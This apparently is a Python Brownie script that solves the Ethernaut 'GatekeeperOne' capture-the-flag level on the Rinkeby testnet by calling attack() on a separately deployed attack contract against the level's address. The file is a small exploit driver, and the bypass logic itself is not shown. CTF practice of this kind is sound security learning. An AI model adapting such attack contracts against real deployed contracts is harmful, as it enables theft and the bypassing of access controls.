from brownie import Contract
from brownie import config, GatekeeperOneAttack
from scripts.helpful_scripts import get_account


def online():
    """
    Function to attack the contract which is in the rinkeby network.
    """
    account = get_account()
    print(f"Using the account {account}")

    # GateKeeperOne
    abi = [
        {
            "inputs": [
                {"internalType": "bytes8", "name": "_gateKey", "type": "bytes8"}
            ],
            "name": "enter",
            "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
            "stateMutability": "nonpayable",
            "type": "function",
        },
        {
            "inputs": [],
            "name": "entrant",
            "outputs": [{"internalType": "address", "name": "", "type": "address"}],
            "stateMutability": "view",
            "type": "function",
        },
    ]
    gatekeeperone = Contract.from_abi(
        "GatekeeperOne", "0xDBC005213D0634F9a04175277F650aD8C27B5F4c", abi
    )
    print(f"Contract GateKeeperOne deployed {gatekeeperone}")

    # GateKeeperAttack
    gatekeeperoneattack = GatekeeperOneAttack[-1]
    print(f"Contract GateKeeperOneAttack deployed {gatekeeperoneattack}")

    r = gatekeeperoneattack.attack(gatekeeperone.address, {"from": account})
    print(f"Event : {r.events}")


def main():
    online()
